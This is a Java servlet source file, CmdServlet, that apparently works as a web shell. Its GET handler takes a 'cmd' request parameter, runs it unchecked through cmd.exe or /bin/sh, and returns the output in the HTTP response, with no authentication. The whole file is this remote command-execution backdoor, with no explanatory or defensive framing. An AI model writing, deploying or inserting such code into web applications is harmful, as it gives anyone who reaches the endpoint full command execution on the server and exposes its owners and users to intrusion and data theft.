package net.servlet;
// Import required java libraries

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Objects;

// Extend HttpServlet class
public class CmdServlet extends javax.servlet.http.HttpServlet {

    private String message;

    public void init() throws ServletException {}

    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String cmd = request.getParameter("cmd");
        ProcessBuilder pb;

        boolean isWindows = System.getProperty("os.name")
                .toLowerCase().startsWith("windows");

        if (isWindows) {
            pb = new ProcessBuilder("cmd.exe", "/c", cmd);
        } else {
            pb = new ProcessBuilder("/bin/sh", "-c", cmd);
        }
        response.setContentType("text/html");
        pb.redirectErrorStream(true);
        Process process = pb.start();
        this.copy(process.getInputStream(),response.getOutputStream());
    }

    private void copy(InputStream in, OutputStream out) throws IOException {
        Objects.requireNonNull(out, "out");
        byte[] buffer = new byte[1024];
        int read;
        while ((read = in.read(buffer, 0, 1024)) >= 0) {
            out.write(buffer, 0, read);
        }
    }

    public void destroy() {}
}